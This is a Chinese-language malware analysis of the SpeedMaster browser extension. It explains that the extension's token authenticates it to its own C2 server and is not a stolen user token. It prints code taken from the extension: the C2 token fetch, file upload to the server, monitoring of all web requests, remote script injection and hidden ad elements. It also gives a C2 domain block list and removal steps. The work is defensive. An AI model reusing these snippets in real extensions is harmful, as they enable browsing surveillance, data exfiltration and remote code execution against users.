# SpeedMaster 插件 Token 深度分析

## 核心发现

**重要结论**: 插件使用的token**不是窃取的用户token**，而是**恶意插件自身与C2服务器之间的认证token**。

## Token 技术分析

### 1. Token 获取流程
```javascript
// 从C2服务器获取token
e = "https://api.extensionplay.com/speed-test/token";
(n = new XMLHttpRequest()).open("GET", e, true);

// 处理响应
a = function (e) {
  e = JSON.parse(e);
  if ("success" === e.status) {
    postMessage({
      item: "info",
      value: {
        token: e.token,      // 获取的token
        time: +new Date()    // 获取时间
      }
    });
  }
};
```

### 2. Token 使用方式
```javascript
// 在上传数据时使用token
const u = new FormData();
u.append("token", o);        // 添加token到表单数据
u.append("key", "random/" + e.data.value);
u.append("file", i);         // 上传的文件数据
```

### 3. Token 有效期
```javascript
// 检查token是否过期（30天有效期）
t - e.data.value.time < 2592e6  // 2592e6毫秒 = 30天
```

## Token 性质分析

### 这不是用户token的证据：

#### 1. 来源不同
- **用户token**: 来自Google、Facebook、银行等用户账户
- **此token**: 来自恶意C2服务器 `api.extensionplay.com`

#### 2. 用途不同
- **用户token**: 用于用户身份验证和授权
- **此token**: 用于恶意插件与C2服务器之间的通信认证

#### 3. 存储位置不同
- **用户token**: 存储在浏览器cookies或localStorage中
- **此token**: 存储在插件的chrome.storage.local中

#### 4. 价值不同
- **用户token**: 可以访问用户账户，具有高价值
- **此token**: 只能访问恶意C2服务器，对其他攻击者无价值

## 真正的数据窃取机制

虽然这个token不是用户token，但插件确实在窃取用户数据：

### 1. 网络监控
```javascript
// 监控所有网络请求
chrome.webRequest.onBeforeRequest.addListener(function (e) {
  // 记录每个域名的请求次数
  o[e.origin] += 1;
}, {
  urls: ["<all_urls>"]  // 监控所有URL
});
```

### 2. 浏览行为收集
- 统计用户访问的网站
- 记录访问频率
- 分析用户兴趣和习惯

### 3. 脚本注入
```javascript
// 在匹配的网站注入恶意脚本
if (e && !new RegExp(e).test(location.origin)) return;
const o = document.createElement("script");
o.src = window.URL.createObjectURL(new Blob([t], {type: "text/javascript"}));
document.body.appendChild(o);
```

### 4. 广告欺诈
```javascript
// 注入隐藏广告
const e = document.createElement("div");
e.id = "ad-placement-id";
e.style.display = "none";
document.body.appendChild(e);
```

## Token 在攻击链中的作用

### 阶段1: 初始感染
1. 用户安装SpeedMaster插件
2. 插件请求过度权限
3. 插件在后台静默运行

### 阶段2: C2注册
1. 插件联系 `api.extensionplay.com/speed-test/token`
2. 获取唯一的认证token
3. Token存储在本地（有效期30天）

### 阶段3: 数据收集
1. 使用token认证上传数据
2. 收集用户浏览行为
3. 定期上报到C2服务器

### 阶段4: 恶意操作
1. 根据C2指令注入广告
2. 劫持用户流量
3. 执行远程恶意代码

## 安全影响评估

### 低风险（对此token）
- **此token泄露**: 影响有限，只能访问恶意C2服务器
- **防护建议**: 阻止对 `api.extensionplay.com` 的访问

### 高风险（对用户数据）
- **浏览数据泄露**: 用户隐私严重受损
- **广告欺诈**: 用户被强制观看广告
- **潜在风险**: 可能升级为更严重的攻击

### 极高风险（系统安全）
- **远程代码执行**: 插件可以动态加载和执行任意代码
- **权限滥用**: 访问所有网站、监控所有请求
- **持久化**: 长期驻留，难以彻底清除

## 检测和防护建议

### 1. 立即措施
```bash
# 移除恶意插件
chrome://extensions/ → 移除 SpeedMaster (ID: ibiejjpajlfljcgjndbonclhcbdcamai)

# 清除插件数据
chrome://settings/clearBrowserData → 选择"所有时间" → 清除
```

### 2. 网络防护
```
# 防火墙规则（阻止C2通信）
Block: api.extensionplay.com
Block: static.cdnprod.com
Block: the-news-desk.com
Block: speed-test.extfans.com
```

### 3. 监控指标
- **网络请求**: 监控到上述域名的连接
- **浏览器行为**: 检测异常的webRequest API使用
- **存储访问**: 监控chrome.storage的异常使用

### 4. 用户教育
- 仅从官方商店安装插件
- 审查插件请求的权限
- 定期检查已安装插件
- 注意插件更新日志

## 结论

**关键要点**:
1. SpeedMaster插件使用的token是**恶意插件自身的认证token**，不是用户token
2. 真正的威胁是**用户数据收集**和**广告欺诈**
3. 插件具有**远程代码执行**能力，风险极高
4. 需要立即移除插件并采取防护措施

**建议优先级**:
1. ✅ 立即移除恶意插件
2. ✅ 清除浏览器数据
3. ✅ 部署网络防护规则
4. ✅ 监控类似恶意行为
5. ✅ 加强用户安全意识教育